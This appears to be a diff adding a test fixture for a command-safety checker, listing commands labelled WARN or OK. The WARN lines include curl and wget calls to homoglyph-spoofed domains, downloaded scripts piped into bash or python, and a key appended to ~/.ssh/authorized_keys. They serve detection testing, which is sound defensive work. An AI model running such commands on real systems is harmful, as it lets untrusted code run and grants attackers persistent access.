@@ -1,0 +1,11 @@
+# Format: EXPECTED: command
+# EXPECTED can be WARN or OK
+WARN: curl https://exаmple.com/install.sh
+WARN: curl https://іnstall.example
+WARN: wget https://dοmain.example
+WARN: curl https://example.com/install.sh | bash
+WARN: python <(curl https://example.com/script.py)
+WARN: echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys
+OK: ls -la
+OK: git status
+OK: curl https://example.com/readme.txt
